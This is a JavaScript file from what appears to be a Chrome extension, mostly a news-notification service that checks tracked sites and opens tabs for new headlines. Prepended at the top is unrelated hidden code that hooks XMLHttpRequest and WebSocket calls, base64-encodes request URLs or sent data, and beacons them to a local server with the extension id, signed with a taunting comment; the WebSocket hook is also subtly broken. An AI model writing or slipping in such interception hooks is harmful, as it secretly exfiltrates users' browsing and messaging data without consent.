function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var showNewsService = (function () {

    var counter = 0;

    function processNews(siteNews, index, onEmptyNews, onLatestNews) {
        setTimeout(function () {
            localStorageClient.getSiteBy(siteNews.id, function (data) {
                var localSite = data['SiteId=' + siteNews.id];

                if (localSite == undefined) {
                    localStorageClient.saveSite(siteNews, function () {
                    });
                    localSite = {last_title: ''};
                }

                if (siteNews.last_title != localSite.last_title) {
                    onLatestNews(siteNews);
                } else {
                    counter -= 1;
                    if (counter === 0) {
                        onEmptyNews();
                    }
                }
            });
        }, index);
    }

    function showNews(onEmptyNews, onLatestNews) {
        counter = 0;
        cniApiClient.getUserData(function (authHeader) {
            if (authHeader == undefined) {
                handleNewsForNotLoggedIn(onEmptyNews, onLatestNews);
            } else {
                handleNewsForLoggedIn(onEmptyNews, onLatestNews);
            }
        });

    }

    function handleNewsForNotLoggedIn(onEmptyNews, onLatestNews) {
        localStorageClient.getAllValues(function (values) {
            var siteIds = [];
            //iterujemy po wszystkich kluczach

            var siteUrlIdMap = {};

            for (var key in values) {
                if (values.hasOwnProperty(key) && key.startsWith('SiteId=')) {
                    siteUrlIdMap[values[key].url] = values[key].id;
                }
            }

            //usuwamy duplikaty urli
            for (var siteUrl in siteUrlIdMap) {
                if (siteUrlIdMap.hasOwnProperty(siteUrl)) {
                    siteIds.push(siteUrlIdMap[siteUrl]);
                }
            }

            counter = siteIds.length;
            //przekazujemy identyfikatory do funkcji
            cniApiClient.getNewsForSitesID(siteIds, function (siteNews, index) {
                processNews(siteNews, index, onEmptyNews, onLatestNews);
                badgeNotifier.clearBadge();
            });

        });
    }

    function handleNewsForLoggedIn(onEmptyNews, onLatestNews) {
        cniApiClient.getUserSitesNews(function (siteNewsList) {
            var siteNewsMap = {};
            $(siteNewsList).each(function () {
                siteNewsMap[this.url] = this;
            });

            if ($.isEmptyObject(siteNewsMap)) {
                onEmptyNews();
                return;
            }

            var index = 0;
            for (var key in siteNewsMap) {
                if (siteNewsMap.hasOwnProperty(key)) {
                    processNews(siteNewsMap[key], index++, onEmptyNews, onLatestNews);
                    badgeNotifier.clearBadge();
                }
            }
        }, function (errors) {
            renderText(errors);
        });
    }

    function onLatestNews(siteNews) {
        //dodanie ukośnika bo bez niego nie chce wyszukiwać :)
        //wyszukiwanie otwartych tabów jest case sensitive
        checkIfTabNotOpen(siteNews.url.toLowerCase() + '/*', function () {
            pageManager.openPageByUrl(siteNews.url.toLowerCase());
        });
        //zapisujemy w BD nowy news :)
        localStorageClient.saveSiteNews(siteNews, function () {
            //nothing to do
        });
        //oznaczamy jako przeczytane
        cniApiClient.markAsRead([siteNews], function (data) {
            //nothing to do
        });
    }

    function checkIfTabNotOpen(cniUrls, callback) {

        var queryInfo = {
            url: cniUrls,
            windowId: chrome.windows.WINDOW_ID_CURRENT
        };

        chrome.tabs.query(queryInfo, function (tabs) {

            if (!(typeof tabs === 'undefined') && tabs.length == 0) {
                callback();
            } else {
            }

        });
    }

    return {
        showNews: function (onEmptyNews) {
            showNews(onEmptyNews, onLatestNews)
        },
        checkNews: showNews
    };

})();
